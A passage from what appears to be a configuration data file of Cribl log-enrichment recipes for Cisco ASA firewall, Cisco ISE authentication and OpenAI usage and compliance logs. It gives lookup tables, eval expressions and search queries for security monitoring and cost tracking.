          notes: 'Message ID ranges: 1xxxxx=firewall, 2xxxxx=IDS, 3xxxxx=web filter, 4xxxxx=IPS, 5xxxxx=failover, 6xxxxx=general, 7xxxxx=VPN. Maintain mapping as new ASA software versions add message IDs.'
        }
      },
      {
        name: 'Internal Asset Lookup',
        description: 'Enrich internal IPs from ASA logs with CMDB context — hostname, business unit, asset owner, and environment classification for incident prioritization.',
        criblFunction: 'Lookup',
        addedFields: ['hostname', 'business_unit', 'asset_owner', 'environment'],
        securityValue: 'Associates denied connections and security events with specific assets and owners, enabling immediate incident assignment without manual CMDB lookup. Critical assets auto-escalate.',
        observabilityValue: 'Enables connection analytics by business unit and environment, identifies departments driving firewall policy violations, and supports segmentation compliance reporting.',
        personas: ['SOC', 'Incident Response', 'NOC', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'cmdb_assets.csv',
            inputField: 'src_ip → ip_address',
            outputFields: ['hostname', 'business_unit', 'asset_owner', 'environment'],
            reloadInterval: '4 hours'
          },
          lookupSample: 'ip_address,hostname,business_unit,asset_owner,environment\n10.1.2.5,app-prod-web01,Commerce,platform-team@company.com,production\n10.1.3.10,db-prod-sql01,Finance,dba-team@company.com,production\n10.2.1.50,dev-testbed-01,Engineering,devops@company.com,development\n10.3.4.25,vpn-concentrator-01,Infrastructure,netops@company.com,production',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: cmdb_assets.csv\n// Input: src_ip → ip_address (exact match)\n// Output: hostname, business_unit, asset_owner, environment\n//\n// BEFORE: { src_ip: "10.1.2.5", dst_ip: "198.51.100.42", message_id: "106023", action: "Deny" }\n// AFTER:  { ..., hostname: "app-prod-web01", business_unit: "Commerce", asset_owner: "platform-team@company.com", environment: "production" }',
          notes: 'Source from ServiceNow CMDB. Also apply to dst_ip for internal-to-internal traffic. Missing entries indicate unmanaged assets — consider routing to a discovery queue for IT asset management.'
        }
      },
      {
        name: 'VPN User Context Lookup',
        description: 'Enrich VPN session events with user organizational context — department, manager, device type — for remote access security monitoring.',
        criblFunction: 'Lookup',
        addedFields: ['user_department', 'user_manager', 'device_type'],
        securityValue: 'Identifies VPN sessions from unexpected departments or device types, enables manager-based escalation workflows, and detects compromised credentials used from unauthorized device types.',
        observabilityValue: 'Enables VPN capacity analysis by department, identifies peak usage patterns per group, and tracks device type distribution for client compatibility planning.',
        personas: ['SOC', 'Security Engineering', 'SRE', 'Incident Response'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'vpn_user_identity.csv',
            inputField: 'vpn_user → username',
            outputFields: ['user_department', 'user_manager', 'device_type'],
            reloadInterval: '6 hours'
          },
          lookupSample: 'username,department,manager,device_type\njsmith,Engineering,kmanager@company.com,corporate_laptop\nmjohnson,Finance,cfo@company.com,corporate_laptop\nexternal-consultant-01,Vendor,procurement@company.com,personal_device\ncexec-vp-sales,Sales,cro@company.com,mobile_device',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: vpn_user_identity.csv\n// Input: vpn_user → username (exact match)\n// Output: department → user_department, manager → user_manager, device_type\n//\n// BEFORE: { vpn_user: "external-consultant-01", message_id: "713049", src_ip: "203.0.113.75", assigned_ip: "10.5.1.100" }\n// AFTER:  { ..., user_department: "Vendor", user_manager: "procurement@company.com", device_type: "personal_device" }',
          notes: 'Sync from HR directory + MDM system. Personal devices from vendor accounts connecting after hours are high-risk indicators. Cross-reference with impossible travel (GeoIP on src_ip) for compromised credential detection.'
        }
      },
      {
        name: 'Connection Volume Eval',
        description: 'Flag high-volume connections based on byte count and duration thresholds — classify into volume buckets for anomaly detection.',
        criblFunction: 'Eval',
        addedFields: ['is_high_volume', 'bytes_bucket', 'duration_bucket'],
        securityValue: 'High-volume outbound connections are primary exfiltration indicators. Long-duration connections suggest persistent C2 channels. Bucketing enables threshold-based alerting without exact-value matching.',
        observabilityValue: 'Enables bandwidth utilization analysis by volume tier, identifies connections driving interface saturation, and supports QoS policy validation.',
        personas: ['SOC', 'NOC', 'Security Engineering', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expressions: [
              'is_high_volume = bytes > 104857600 ? \'true\' : \'false\'',
              'bytes_bucket = bytes > 1073741824 ? \'over_1GB\' : bytes > 104857600 ? \'100MB_1GB\' : bytes > 10485760 ? \'10MB_100MB\' : bytes > 1048576 ? \'1MB_10MB\' : \'under_1MB\'',
              'duration_bucket = duration > 86400 ? \'over_24h\' : duration > 3600 ? \'1h_24h\' : duration > 300 ? \'5min_1h\' : \'under_5min\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Classify connection volume and duration\n//\n// BEFORE: { src_ip: "10.1.2.5", dst_ip: "198.51.100.1", bytes: 524288000, duration: 7200 }\n// AFTER:  { ..., is_high_volume: "true", bytes_bucket: "100MB_1GB", duration_bucket: "1h_24h" }',
          notes: 'Thresholds: >100MB = high volume flag. Duration >1h combined with high volume and outbound direction is a strong exfiltration indicator. Tune thresholds based on your environment — file servers and backups legitimately transfer large volumes.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Connection Pattern Baseline',
        description: 'At investigation time, retrieve hourly connection baselines for a source IP and compute an anomaly score against current activity levels.',
        criblFunction: 'Search-time lookup',
        addedFields: ['avg_connections_src_hourly', 'connection_anomaly_score'],
        securityValue: 'Quantifies how anomalous a host\'s current connection behavior is relative to its historical baseline. High anomaly scores indicate scanning, worm propagation, or compromised hosts phoning home.',
        observabilityValue: 'Supports automated capacity alerting when hosts exceed baseline thresholds, identifies application behavior changes post-deployment, and detects connection table exhaustion risks.',
        personas: ['SOC', 'Threat Hunting', 'NOC', 'SRE'],
        implementation: {
          example: '// Cribl Search connection pattern baseline:\n// dataset="cisco_asa" earliest=-14d latest=-1d\n// | where src_ip == "$SUSPECT_IP"\n// | extend hour_of_day = format_datetime(timestamp, \'HH\')\n// | summarize hourly_connections=count() by hour_of_day\n// | summarize avg_connections_src_hourly=round(avg(hourly_connections), 0), stddev_conn=round(stdev(hourly_connections), 0)\n// | extend connection_anomaly_score = round(($CURRENT_CONNECTIONS - avg_connections_src_hourly) / iif(stddev_conn > 0, stddev_conn, 1), 2)\n// | extend risk_level = iif(connection_anomaly_score > 3, "high", iif(connection_anomaly_score > 2, "medium", "normal"))',
          notes: 'Anomaly score uses z-score methodology — values >3 represent behavior beyond 3 standard deviations. Factor in time-of-day for more accurate baselines (servers behave differently at 2am vs 2pm). Minimum 14 days of data recommended.'
        }
      },
      {
        name: 'Denied Traffic Trending',
        description: 'At investigation time, analyze deny rate trends for a source IP or subnet over 7 days to identify escalating block activity or policy misconfigurations.',
        criblFunction: 'Search-time lookup',
        addedFields: ['deny_trend_direction', 'deny_rate_7d_avg'],
        securityValue: 'Rising deny trends from an internal host suggest malware scanning or misconfigured applications probing blocked destinations. Sudden deny spikes from external IPs indicate targeted attack reconnaissance.',
        observabilityValue: 'Identifies firewall rules generating increasing deny volumes (potential misconfigurations), tracks policy change impact on deny rates, and supports rule optimization efforts.',
        personas: ['SOC', 'NOC', 'Security Engineering', 'SRE'],
        implementation: {
          example: '// Cribl Search denied traffic trending:\n// dataset="cisco_asa" earliest=-7d\n// | where src_ip == "$SUSPECT_IP" and action == "Deny"\n// | extend day_bucket = format_datetime(timestamp, \'yyyy-MM-dd\')\n// | summarize daily_denies=count() by day_bucket\n// | order by day_bucket asc\n// | extend deny_rate_7d_avg=round(avg(daily_denies), 0)\n// | extend prev_day = prev(daily_denies)\n// | extend trend_pct = round((daily_denies - prev_day) / iif(prev_day > 0, prev_day, 1) * 100, 1)\n// | summarize deny_trend_direction=iif(arg_max(day_bucket, daily_denies) > deny_rate_7d_avg, "increasing", "decreasing")',
          notes: 'Increasing deny trends from internal hosts should trigger investigation — the host may be compromised and scanning. Decreasing trends after a policy change confirm the change was effective. Compare weekday vs weekend patterns for accuracy.'
        }
      }
    ]
  },
  'cisco-ise': {
    streamTime: [
      {
        name: 'Endpoint Classification Lookup',
        description: 'Enrich endpoint MAC addresses with device profiling data — category, manufacturer, management status, and compliance requirements from the ISE profiling database.',
        criblFunction: 'Lookup',
        addedFields: ['device_category', 'device_manufacturer', 'is_managed', 'compliance_required'],
        securityValue: 'Identifies unmanaged/BYOD devices accessing sensitive resources, detects MAC spoofing by comparing profiled category vs claimed identity, and enables device-type-based access policies.',
        observabilityValue: 'Enables device type distribution dashboards, tracks BYOD vs corporate device ratios, identifies manufacturer-specific issues for firmware update planning.',
        personas: ['SOC', 'Security Engineering', 'NOC', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'endpoint_profiles.csv',
            inputField: 'endpoint_mac → mac_address',
            outputFields: ['device_category', 'device_manufacturer', 'is_managed', 'compliance_required'],
            reloadInterval: '2 hours'
          },
          lookupSample: 'mac_address,device_category,device_manufacturer,is_managed,compliance_required\n00:1A:2B:3C:4D:5E,Workstation,Dell,true,true\nAA:BB:CC:11:22:33,Mobile,Apple,true,true\n00:50:56:AB:CD:EF,Server,VMware,true,false\nDE:AD:BE:EF:00:01,IoT,Honeywell,false,false',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: endpoint_profiles.csv\n// Input: endpoint_mac → mac_address (exact match)\n// Output: device_category, device_manufacturer, is_managed, compliance_required\n//\n// BEFORE: { endpoint_mac: "AA:BB:CC:11:22:33", username: "jsmith", nas_ip: "10.1.1.1", auth_result: "PASS" }\n// AFTER:  { ..., device_category: "Mobile", device_manufacturer: "Apple", is_managed: "true", compliance_required: "true" }',
          notes: 'Export from ISE profiling database via REST API every 2 hours. Unknown MACs (no match) indicate new/rogue devices — trigger NAC posture assessment. IoT devices (is_managed=false) should be segmented to restricted VLANs.'
        }
      },
      {
        name: 'Auth Result Enrichment Eval',
        description: 'Classify ISE authentication message codes into human-readable results, categories, and failure severity levels for streamlined alerting.',
        criblFunction: 'Eval',
        addedFields: ['auth_result', 'auth_category', 'is_failure', 'failure_severity'],
        securityValue: 'Translates cryptic ISE message codes (5200, 5400, 5440) into actionable categories. High-severity failures (wrong credentials, certificate issues) immediately flag potential credential attacks or misconfigurations.',
        observabilityValue: 'Enables authentication success/failure ratio monitoring, identifies error category spikes after infrastructure changes, and supports RADIUS health dashboards.',
        personas: ['SOC', 'Security Engineering', 'NOC', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expressions: [
              'auth_result = /^5200/.test(message_code) ? \'success\' : /^5400/.test(message_code) ? \'failed_credentials\' : /^5440/.test(message_code) ? \'failed_policy\' : /^5405/.test(message_code) ? \'failed_radius\' : \'unknown\'',
              'auth_category = /^52/.test(message_code) ? \'authentication_success\' : /^54/.test(message_code) ? \'authentication_failure\' : /^56/.test(message_code) ? \'accounting\' : \'other\'',
              'is_failure = /^5[4-5]/.test(message_code) ? \'true\' : \'false\'',
              'failure_severity = auth_result==\'failed_credentials\' ? \'high\' : auth_result==\'failed_policy\' ? \'medium\' : auth_result==\'failed_radius\' ? \'critical\' : \'none\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Classify ISE authentication message codes\n//\n// BEFORE: { message_code: "5400", username: "jsmith", endpoint_mac: "AA:BB:CC:11:22:33", nas_ip: "10.1.1.1" }\n// AFTER:  { ..., auth_result: "failed_credentials", auth_category: "authentication_failure", is_failure: "true", failure_severity: "high" }',
          notes: 'ISE message code ranges: 5200-5299=success, 5400-5499=auth failure, 5300-5399=authorization, 5600-5699=accounting. Failed_radius (5405) indicates infrastructure issues — the RADIUS server itself is unreachable, which is critical operational impact.'
        }
      },
      {
        name: 'Network Device Lookup',
        description: 'Enrich the network access device (NAS) with inventory context — role, physical location, model, and site designation from network inventory.',
        criblFunction: 'Lookup',
        addedFields: ['device_role', 'device_location', 'device_model', 'device_site'],
        securityValue: 'Identifies auth failures concentrated on specific access switches (possible rogue device), enables location-aware access policies, and detects unauthorized network devices attempting RADIUS authentication.',
        observabilityValue: 'Enables per-site and per-device-role authentication metrics, identifies hardware models with higher failure rates, and supports network device lifecycle planning.',
        personas: ['NOC', 'Security Engineering', 'Platform Engineering', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'network_device_inventory.csv',
            inputField: 'network_device_name → device_name',
            outputFields: ['device_role', 'device_location', 'device_model', 'device_site'],
            reloadInterval: '4 hours'
          },
          lookupSample: 'device_name,device_role,device_location,device_model,device_site\nsw-access-bldg1-fl2,access_switch,Building 1 Floor 2,Catalyst 9300,HQ-Campus\nsw-distro-dc1-01,distribution,Data Center 1,Nexus 9000,DC-Primary\nwlc-hq-01,wireless_controller,Building 1 NOC,C9800,HQ-Campus\nsw-access-branch-nyc-01,access_switch,NYC Branch Office,Catalyst 9200,Branch-NYC',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: network_device_inventory.csv\n// Input: network_device_name → device_name (exact match)\n// Output: device_role, device_location, device_model, device_site\n//\n// BEFORE: { network_device_name: "sw-access-bldg1-fl2", username: "jsmith", auth_result: "PASS", endpoint_mac: "AA:BB:CC:11:22:33" }\n// AFTER:  { ..., device_role: "access_switch", device_location: "Building 1 Floor 2", device_model: "Catalyst 9300", device_site: "HQ-Campus" }',
          notes: 'Source from Cisco DNA Center or network inventory system. Unknown device names indicate unauthorized network equipment — should trigger immediate security review. Device_site enables site-level authentication dashboards.'
        }
      },
      {
        name: 'User Risk Lookup',
        description: 'Enrich authenticating usernames with risk context — risk score, VIP status, account type, and last security incident date for risk-adaptive access decisions.',
        criblFunction: 'Lookup',
        addedFields: ['user_risk_score', 'user_vip', 'account_type', 'last_incident'],
        securityValue: 'Enables risk-adaptive authentication — high-risk users get stricter posture checks. VIP accounts trigger enhanced monitoring. Recent incident history flags accounts that may still be compromised.',
        observabilityValue: 'Tracks authentication patterns by risk tier, identifies high-risk accounts driving failure volume, and supports compliance reporting on privileged account access.',
        personas: ['SOC', 'Security Engineering', 'Incident Response', 'Compliance'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'user_risk_registry.csv',
            inputField: 'username → user',
            outputFields: ['user_risk_score', 'user_vip', 'account_type', 'last_incident'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'user,risk_score,vip,account_type,last_incident\njsmith,25,false,employee,N/A\ncexec-cfo,40,true,executive,N/A\nsvc-backup-01,60,false,service_account,2026-03-15\nexternal-auditor-02,75,false,contractor,2026-05-20',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: user_risk_registry.csv\n// Input: username → user (exact match)\n// Output: risk_score → user_risk_score, vip → user_vip, account_type, last_incident\n//\n// BEFORE: { username: "external-auditor-02", endpoint_mac: "DE:AD:BE:EF:00:01", nas_ip: "10.1.1.5", auth_result: "PASS" }\n// AFTER:  { ..., user_risk_score: 75, user_vip: "false", account_type: "contractor", last_incident: "2026-05-20" }',
          notes: 'Aggregate risk scores from UEBA, HR flags, and incident history. Update hourly to reflect recent incidents. Service accounts (risk_score >50) authenticating from unexpected devices should auto-trigger investigation. VIP accounts require enhanced logging regardless of risk score.'
        }
      },
      {
        name: 'Posture Compliance Eval',
        description: 'Classify endpoint posture assessment status into compliance levels and determine remediation or quarantine eligibility based on ISE posture results.',
        criblFunction: 'Eval',
        addedFields: ['compliance_level', 'remediation_required', 'quarantine_eligible'],
        securityValue: 'Non-compliant endpoints accessing production resources represent active risk. Quarantine-eligible classification enables automated network isolation of severely non-compliant devices before they can spread threats.',
        observabilityValue: 'Tracks compliance rates across the fleet, identifies posture check failures by type for IT remediation prioritization, and monitors quarantine queue depth for operational capacity.',
        personas: ['SOC', 'Security Engineering', 'NOC', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expressions: [
              'compliance_level = posture_status==\'Compliant\' ? \'full\' : posture_status==\'NonCompliant\' && /^(av_outdated|patches_missing)/.test(posture_detail) ? \'partial\' : posture_status==\'NonCompliant\' ? \'non_compliant\' : \'unknown\'',
              'remediation_required = compliance_level==\'partial\' || compliance_level==\'non_compliant\' ? \'true\' : \'false\'',
              'quarantine_eligible = compliance_level==\'non_compliant\' && /^(no_av|jailbroken|no_encryption)/.test(posture_detail) ? \'true\' : \'false\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// Classify posture status into compliance levels\n//\n// BEFORE: { posture_status: "NonCompliant", posture_detail: "no_av", endpoint_mac: "DE:AD:BE:EF:00:01", username: "contractor-01" }\n// AFTER:  { ..., compliance_level: "non_compliant", remediation_required: "true", quarantine_eligible: "true" }',
          notes: 'Quarantine triggers: no AV installed, jailbroken devices, no disk encryption. Partial compliance (outdated AV, missing patches) gets remediation notice but retains network access with restrictions. Monitor quarantine_eligible rate — sudden spikes may indicate posture policy changes rather than actual threats.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Auth Pattern Baseline',
        description: 'At investigation time, retrieve a user\'s normal authentication time windows and frequency to identify sessions outside established patterns.',
        criblFunction: 'Search-time lookup',
        addedFields: ['normal_auth_hours', 'auth_frequency_baseline'],
        securityValue: 'Authentications outside normal hours (e.g., 3am for a 9-5 user) are strong indicators of compromised credentials. Frequency deviations suggest automated attack tools or lateral movement attempts.',
        observabilityValue: 'Supports access pattern optimization (extend access hours where needed), identifies users with erratic schedules for flexible policy assignment, and validates time-based policy effectiveness.',
        personas: ['SOC', 'Threat Hunting', 'Security Engineering'],
        implementation: {
          example: '// Cribl Search auth pattern baseline:\n// dataset="cisco_ise" earliest=-30d latest=-1d\n// | where username == "$SUSPECT_USER" and auth_category == "authentication_success"\n// | extend hour_of_day = toint(format_datetime(timestamp, \'HH\'))\n// | summarize auth_count=count() by hour_of_day\n// | where auth_count > 5\n// | summarize normal_auth_hours=makeset(hour_of_day), auth_frequency_baseline=sum(auth_count)/30\n// | extend is_current_hour_normal = iif(array_index_of(normal_auth_hours, $CURRENT_HOUR) >= 0, "yes", "no")\n// | extend frequency_deviation = round(($TODAY_AUTH_COUNT - auth_frequency_baseline) / auth_frequency_baseline * 100, 1)',
          notes: 'Normal hours defined as hours with >5 successful auths over 30 days. Authentications outside these windows combined with unusual device or location are high-confidence compromise indicators. Service accounts should have very tight baselines — any deviation warrants investigation.'
        }
      },
      {
        name: 'Endpoint History',
        description: 'At investigation time, retrieve an endpoint\'s authentication history — first seen date, profile changes, and failure count — to assess device trust level.',
        criblFunction: 'Search-time lookup',
        addedFields: ['first_seen_date', 'previous_profiles', 'auth_failures_30d'],
        securityValue: 'New endpoints (first_seen recently) with immediate access to sensitive resources are suspicious. Profile changes (laptop→printer) indicate MAC spoofing. High failure counts suggest brute-force or misconfiguration.',
        observabilityValue: 'Tracks endpoint onboarding velocity, identifies devices with unstable profiles requiring ISE policy tuning, and monitors fleet-wide authentication health.',
        personas: ['SOC', 'Threat Hunting', 'Security Engineering', 'NOC'],
        implementation: {
          example: '// Cribl Search endpoint history:\n// dataset="cisco_ise" earliest=-90d\n// | where endpoint_mac == "$SUSPECT_MAC"\n// | summarize first_seen_date=min(timestamp), previous_profiles=makeset(device_category), auth_failures_30d=countif(is_failure=="true" and timestamp > ago(30d)), total_auths=count(), unique_users=dcount(username) by endpoint_mac\n// | extend days_known = datetime_diff(\'day\', now(), first_seen_date)\n// | extend trust_assessment = iif(days_known < 7, "new_device", iif(auth_failures_30d > 50, "high_failure_device", iif(array_length(previous_profiles) > 2, "unstable_profile", "established")))\n// | extend multi_user_flag = iif(unique_users > 3, "shared_or_suspicious", "normal")',
          notes: 'Devices first seen <7 days ago attempting privileged access should trigger enhanced monitoring. Multiple profile changes suggest NAC evasion attempts. Endpoints used by >3 unique users may be shared devices (kiosks) or compromised — investigate context.'
        }
      }
    ]
  },
  'openai-usage': {
    streamTime: [
      {
        name: 'Project Classification Lookup',
        description: 'Enrich project_id with project context including name, owner, environment, and cost center from a maintained project registry CSV.',
        criblFunction: 'Lookup',
        addedFields: ['project_name', 'project_owner', 'project_environment', 'cost_center'],
        securityValue: 'Identifies API usage from unknown or decommissioned projects, enables detection of shadow AI projects operating outside governance frameworks.',
        observabilityValue: 'Enables cost attribution by project and owner, supports chargeback models, identifies orphaned projects consuming budget.',
        personas: ['SOC', 'SRE', 'FinOps', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'openai_projects.csv',
            inputField: 'project_id → id',
            outputFields: ['project_name', 'project_owner', 'project_environment', 'cost_center'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'id,project_name,project_owner,project_environment,cost_center\nproj_abc123,customer-chatbot,ml-team,production,CC-4500\nproj_def456,internal-copilot,platform-eng,production,CC-4200\nproj_ghi789,research-sandbox,data-science,development,CC-4800\nproj_jkl012,qa-automation,qa-team,staging,CC-4300',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: openai_projects.csv\n// Input: project_id → id (exact match)\n// Output: project_name, project_owner, project_environment, cost_center\n//\n// BEFORE: { project_id: "proj_abc123", model: "gpt-4o", tokens: 15000 }\n// AFTER:  { project_id: "proj_abc123", project_name: "customer-chatbot", project_owner: "ml-team", project_environment: "production", cost_center: "CC-4500" }',
          notes: 'Maintain project registry via API sync from OpenAI org settings. Flag any project_id not found in lookup as "unregistered" for governance review.'
        }
      },
      {
        name: 'Model Cost Tier Eval',
        description: 'Classify the model used in each API call by cost tier to enable budget alerting and consumption governance.',
        criblFunction: 'Eval',
        addedFields: ['cost_tier', 'is_expensive_model', 'budget_category'],
        securityValue: 'Detects unexpected use of expensive models that may indicate compromised API keys being used for resource-intensive tasks or unauthorized model access.',
        observabilityValue: 'Powers cost tier dashboards, enables alerts when expensive model usage spikes, supports model migration planning with clear tier visibility.',
        personas: ['SRE', 'FinOps', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            evaluations: [
              'cost_tier = /^(gpt-4o|gpt-4-turbo|o1|o3)/.test(model) ? \'premium\' : /^(gpt-4o-mini|gpt-3.5)/.test(model) ? \'standard\' : \'economy\'',
              'is_expensive_model = cost_tier === \'premium\' ? \'true\' : \'false\'',
              'budget_category = cost_tier === \'premium\' ? \'high-cost\' : cost_tier === \'standard\' ? \'moderate-cost\' : \'low-cost\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// BEFORE: { model: "gpt-4o", tokens: 50000 }\n// AFTER:  { model: "gpt-4o", cost_tier: "premium", is_expensive_model: "true", budget_category: "high-cost" }',
          notes: 'Update model regex patterns when OpenAI releases new models. Review tier assignments quarterly as pricing changes. Consider adding cost-per-token multiplier for precise cost estimation.'
        }
      },
      {
        name: 'Content Filter Severity Eval',
        description: 'Aggregate content filter results across categories to determine overall filter severity and whether human review is required.',
        criblFunction: 'Eval',
        addedFields: ['filter_triggered', 'filter_max_severity', 'requires_review'],
        securityValue: 'Identifies attempts to bypass content policies, detects prompt injection patterns through repeated filter triggers, enables rapid escalation of high-severity content violations.',
        observabilityValue: 'Tracks content policy effectiveness, measures false positive rates across filter categories, identifies applications generating excessive filter triggers.',
        personas: ['SOC', 'Compliance', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            evaluations: [
              'filter_triggered = (hate_severity > 0 || violence_severity > 0 || sexual_severity > 0 || self_harm_severity > 0) ? \'true\' : \'false\'',
              'filter_max_severity = Math.max(hate_severity || 0, violence_severity || 0, sexual_severity || 0, self_harm_severity || 0)',
              'requires_review = filter_max_severity >= 2 ? \'true\' : \'false\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// BEFORE: { hate_severity: 0, violence_severity: 2, sexual_severity: 0, self_harm_severity: 0 }\n// AFTER:  { ..., filter_triggered: "true", filter_max_severity: 2, requires_review: "true" }',
          notes: 'Severity scale: 0=safe, 1=low, 2=medium, 3=high. Any severity >= 2 warrants human review. Aggregate these for weekly compliance reports and tune detection thresholds based on false positive feedback.'
        }
      },
      {
        name: 'User Department Lookup',
        description: 'Enrich user identifiers with organizational context including department, manager, and AI usage tier from HR/IAM directory.',
        criblFunction: 'Lookup',
        addedFields: ['department', 'manager', 'ai_usage_tier'],
        securityValue: 'Enables detection of anomalous AI usage relative to role (e.g., finance user accessing code generation models), supports insider threat correlation by department.',
        observabilityValue: 'Enables department-level usage dashboards, supports per-team quota enforcement, identifies departments needing additional AI training or resources.',
        personas: ['SOC', 'SRE', 'FinOps', 'Compliance'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'user_directory.csv',
            inputField: 'user_id → id',
            outputFields: ['department', 'manager', 'ai_usage_tier'],
            reloadInterval: '4 hours'
          },
          lookupSample: 'id,department,manager,ai_usage_tier\nuser_001,Engineering,jane.smith,unlimited\nuser_002,Marketing,bob.jones,standard\nuser_003,Finance,carol.white,restricted\nuser_004,Data Science,dave.lee,unlimited',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: user_directory.csv\n// Input: user_id → id (exact match)\n// Output: department, manager, ai_usage_tier\n//\n// BEFORE: { user_id: "user_002", model: "gpt-4o", tokens: 25000 }\n// AFTER:  { user_id: "user_002", department: "Marketing", manager: "bob.jones", ai_usage_tier: "standard" }',
          notes: 'Sync from identity provider (Okta/Azure AD) daily. Usage tier determines alerting thresholds — "restricted" users trigger alerts on premium model usage. Update on role changes.'
        }
      },
      {
        name: 'GeoIP Enrichment',
        description: 'Add geographic context to API request source IPs to identify unusual access locations and support regional compliance requirements.',
        criblFunction: 'GeoIP',
        addedFields: ['geo_country', 'geo_city', 'geo_asn'],
        securityValue: 'Detects API key usage from unexpected geographies, identifies impossible travel scenarios, flags access from embargoed nations or high-risk ASNs.',
        observabilityValue: 'Maps API consumption by region, identifies latency patterns tied to geography, supports data residency compliance tracking.',
        personas: ['SOC', 'Security Engineering', 'Compliance'],
        implementation: {
          functionConfig: {
            function: 'GeoIP',
            inputField: 'ip_address',
            geoipDatabase: 'MaxMind GeoLite2-City + GeoLite2-ASN',
            outputPrefix: 'geo_'
          },
          example: '// Cribl Stream → Processing → GeoIP Function\n// Input Field: ip_address\n// Output Fields: geo_country, geo_city, geo_asn\n//\n// BEFORE: { ip_address: "203.0.113.50", user_id: "user_001", model: "gpt-4o" }\n// AFTER:  { ip_address: "203.0.113.50", geo_country: "DE", geo_city: "Frankfurt", geo_asn: "AS24940", user_id: "user_001" }',
          notes: 'Combine with user baseline location for impossible travel detection. API keys used from >3 countries in 24h should trigger investigation. MaxMind databases auto-update weekly.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Usage Baseline',
        description: 'At investigation time, retrieve a user or project\'s historical token consumption baseline to identify cost anomalies and unusual activity spikes.',
        criblFunction: 'Search-time lookup',
        addedFields: ['avg_daily_tokens', 'cost_anomaly_score'],
        securityValue: 'Token consumption spikes (10x+ baseline) indicate compromised API keys being exploited for bulk data extraction or cryptomining-style abuse.',
        observabilityValue: 'Enables proactive cost anomaly alerting, supports capacity forecasting, identifies runaway applications before budget impact becomes severe.',
        personas: ['SOC', 'SRE', 'FinOps'],
        implementation: {
          example: '// Cribl Search usage baseline:\n// dataset="openai_usage" earliest=-30d latest=-1d\n// | where user_id == "$SUSPECT_USER"\n// | summarize avg_daily_tokens=avg(total_tokens), stddev_tokens=stdev(total_tokens) by user_id\n// | extend cost_anomaly_score = round(($TODAY_TOKENS - avg_daily_tokens) / stddev_tokens, 2)\n// | extend anomaly_level = iif(cost_anomaly_score > 3, "critical", iif(cost_anomaly_score > 2, "high", iif(cost_anomaly_score > 1, "moderate", "normal")))',
          notes: 'Anomaly score uses standard deviations from 30-day mean. Score >3 = critical (99.7th percentile). New users need 7+ days of history before baseline is reliable. Exclude batch jobs from user baselines.'
        }
      },
      {
        name: 'Model Adoption Trending',
        description: 'At investigation time, determine a user or project\'s model usage patterns and migration status relative to organizational model strategy.',
        criblFunction: 'Search-time lookup',
        addedFields: ['model_usage_rank', 'migration_status'],
        securityValue: 'Users still on deprecated models after migration deadline may be circumventing security controls added to newer model versions.',
        observabilityValue: 'Tracks model migration progress across teams, identifies holdouts blocking deprecation timelines, supports informed model lifecycle decisions.',
        personas: ['SRE', 'Platform Engineering', 'FinOps'],
        implementation: {
          example: '// Cribl Search model adoption:\n// dataset="openai_usage" earliest=-7d\n// | where project_id == "$TARGET_PROJECT"\n// | summarize request_count=count() by model\n// | sort by request_count desc\n// | extend model_usage_rank=row_number()\n// | extend migration_status = iif(model in ("gpt-3.5-turbo", "gpt-4-0314"), "deprecated_model", iif(model in ("gpt-4o", "gpt-4o-mini"), "current", "legacy"))',
          notes: 'Update deprecated model list when OpenAI announces deprecations. Projects with >50% traffic on deprecated models need migration plans. Use this to build weekly migration progress reports for platform team.'
        }
      }
    ]
  },
  'openai-compliance': {
    streamTime: [
      {
        name: 'User Risk Lookup',
        description: 'Enrich user_id with risk profile data including risk score, violation history, and department context from a compliance-maintained CSV.',
        criblFunction: 'Lookup',
        addedFields: ['user_risk_score', 'previous_violations', 'department'],
        securityValue: 'Enables risk-weighted alert prioritization — violations from high-risk users (previous offenders, privileged roles) escalate faster than first-time minor infractions.',
        observabilityValue: 'Supports risk distribution dashboards, tracks recidivism rates, identifies departments with systemic compliance gaps needing targeted training.',
        personas: ['SOC', 'Compliance', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'user_risk_profiles.csv',
            inputField: 'user_id → id',
            outputFields: ['user_risk_score', 'previous_violations', 'department'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'id,user_risk_score,previous_violations,department\nuser_001,25,0,Engineering\nuser_002,72,3,Marketing\nuser_003,45,1,Finance\nuser_004,90,7,Sales',
